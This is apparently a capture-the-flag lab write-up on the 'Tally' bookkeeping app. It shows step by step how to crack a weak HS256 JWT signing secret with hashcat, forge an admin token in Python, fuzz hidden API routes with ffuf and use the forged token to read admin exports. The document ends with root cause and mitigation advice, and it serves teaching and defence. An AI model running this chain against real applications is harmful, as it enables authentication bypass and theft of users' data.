---
title: "JWT Secret Cracking & Privilege Escalation via Forged Tokens | Tally"
date: 2026-05-14 18:30:00 +0530
categories: [Web Security, Broken Authentication]
tags: [jwt, authentication, broken authentication, weak secret, hashcat, privilege escalation, api security, ffuf, webverse]
platform: Webverse
author: Shivansh Sharma
image:
  path: /assets/images/posts/tally.webp
  alt: JWT Secret Cracking and Admin Token Forgery in Tally
---

# JWT Secret Cracking & Privilege Escalation via Forged Tokens | Tally

## Overview

Tally is a lightweight bookkeeping micro-SaaS built for freelancers and small studios. Authentication relied on JSON Web Tokens (JWTs) signed using the `HS256` algorithm. However, the application used an extremely weak signing secret that could be cracked offline using a common wordlist attack.

After recovering the signing secret, it was possible to forge arbitrary JWTs and escalate privileges from a normal user account to administrator access.

The forged administrator token exposed restricted API endpoints containing sensitive client export data and the lab flag.

---

## Objective

The goal of this lab was to:

- Analyze the application's authentication mechanism
- Extract and inspect JWT tokens
- Crack the JWT signing secret
- Forge an administrator token
- Discover hidden admin endpoints
- Access protected administrative data

---

## Initial Setup

The lab required adding the target hostname locally.

```bash
echo "10.100.0.30  tally.local" | sudo tee -a /etc/hosts
```

After registering an account and logging in, a JWT token was stored in the browser's local storage.

---

## Identifying the JWT Token

The token looked like this:

```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjMsImVtYWlsIjoia2VsdmluQGtlbC5jb20iLCJuYW1lIjoia2VsdmluIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3Nzg3MjA5NjcsImV4cCI6MTc3OTMyNTc2N30.IsoJtR76Brpoh4V2L8wVhSkDse0WQr-wHmyJMpIglCk
```

The token used the `HS256` signing algorithm, meaning the server validated the signature using a shared secret.

Because JWTs signed with HMAC algorithms rely entirely on the secrecy and strength of the signing key, weak secrets become vulnerable to offline cracking attacks.

---

## Preparing the Token for Cracking

The JWT was saved into a file for Hashcat processing.

```bash
echo -n "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjMsImVtYWlsIjoia2VsdmluQGtlbC5jb20iLCJuYW1lIjoia2VsdmluIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3Nzg3MjA5NjcsImV4cCI6MTc3OTMyNTc2N30.IsoJtR76Brpoh4V2L8wVhSkDse0WQr-wHmyJMpIglCk" > token.txt
```

---

## Cracking the JWT Secret

Hashcat mode `16500` is specifically designed for cracking JWT tokens signed using HMAC algorithms such as `HS256`.

```bash
hashcat -m 16500 token.txt /usr/share/wordlists/rockyou.txt
```

After running the attack, the signing secret was recovered:

```text
tally123
```

This confirmed that the application used a predictable and weak JWT signing key.

---

## Forging an Administrator Token

Once the secret was known, forging arbitrary tokens became trivial.

The original token contained a role field:

```json
"role": "user"
```

The role was modified to:

```json
"role": "admin"
```

A new JWT was generated using Python.

```python
import jwt

payload = {
  "sub": 3,
  "email": "kelvin@kel.com",
  "name": "kelvin",
  "role": "admin",
  "iat": 1778719930,
  "exp": 1779324730
}

token = jwt.encode(payload, "tally123", algorithm="HS256")

print("JWT Token:\n", token)
```

Generated administrator token:

```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjMsImVtYWlsIjoia2VsdmluQGtlbC5jb20iLCJuYW1lIjoia2VsdmluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzc4NzE5OTMwLCJleHAiOjE3NzkzMjQ3MzB9.3V1tpZE4fdQjPLmLkzJ2QMgnTtSv28qdFAYAcr8QgzY
```

---

## Reconnaissance of API Endpoints

While reviewing Burp Suite history during authentication, the following endpoint was identified:

```text
/api/auth/me
```

This suggested the application exposed API-based authenticated functionality.

An attempt was made to directly access a guessed administrator endpoint:

```text
/api/admin
```

However, the request failed.

To discover hidden administrative routes, directory enumeration was performed using `ffuf`.

```bash
ffuf -u http://tally.local/api/admin/FUZZ -w /usr/share/wordlists/dirb/big.txt
```

A valid endpoint was discovered:

```text
/exports
```

Resulting administrative path:

```text
/api/admin/exports
```

---

## Accessing Restricted Administrative Data

The forged administrator JWT was added to the `Authorization` header.

```http
GET /api/admin/exports HTTP/1.1
Host: tally.local
Authorization: Bearer <FORGED_ADMIN_TOKEN>
```

Full request:

```http
GET /api/admin/exports HTTP/1.1
Host: tally.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Referer: http://tally.local/app
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjMsImVtYWlsIjoia2VsdmluQGtlbC5jb20iLCJuYW1lIjoia2VsdmluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzc4NzE5OTMwLCJleHAiOjE3NzkzMjQ3MzB9.3V1tpZE4fdQjPLmLkzJ2QMgnTtSv28qdFAYAcr8QgzY
Connection: keep-alive
```

The server accepted the forged token and returned sensitive administrative export data, including the flag.

```text
WEBVERSE{...}
```

---

## Proof of Exploitation

### Weak JWT Secret

```text
tally123
```

### Forged Role Claim

```json
"role": "admin"
```

### Exposed Administrative Endpoint

```text
/api/admin/exports
```

### Successful Privilege Escalation

```text
WEBVERSE{...}
```

---

## Impact

This vulnerability allowed complete authentication bypass and privilege escalation.

An attacker could:

- Forge arbitrary JWT tokens
- Impersonate other users
- Escalate privileges to administrator
- Access sensitive accounting exports
- Extract confidential client data
- Bypass application authorization controls entirely

Because JWT validation trusted the token signature alone, compromise of the signing secret resulted in full trust compromise across the application.

---

## Root Cause Analysis

The primary issue was the use of a weak JWT signing secret.

Additional contributing issues included:

- Predictable secret key selection
- Lack of secret rotation
- Overreliance on client-controlled role claims
- Exposure of sensitive admin functionality through predictable API structure
- Missing defense-in-depth authorization validation

The application trusted the `role` field directly from the signed token without additional server-side privilege verification.

---

## Mitigation

### Use Strong Random Secrets

JWT signing keys should be:

- Long
- Random
- Cryptographically generated
- Stored securely

Example:

```bash
openssl rand -base64 64
```

### Rotate Secrets Periodically

Implement key rotation mechanisms and invalidate older tokens when secrets change.

### Avoid Storing Sensitive Authorization Logic Solely in JWT Claims

Critical authorization decisions should be validated server-side against trusted backend data.

### Use Short Token Expiration Windows

Reduce exposure time for compromised tokens.

### Monitor for Enumeration Attempts

Detect excessive fuzzing or suspicious access to hidden administrative routes.

---

## Real-World Insight

Weak JWT secrets remain one of the most common authentication failures in smaller startups and internal applications.

Developers often assume that because JWTs are signed, they are inherently secure. In reality, JWT security depends entirely on the secrecy and strength of the signing key.

If an attacker can recover the secret through brute force or leakage, they effectively gain the ability to mint trusted identities at will.

This lab demonstrates how a single weak secret can completely collapse an application's authentication and authorization model.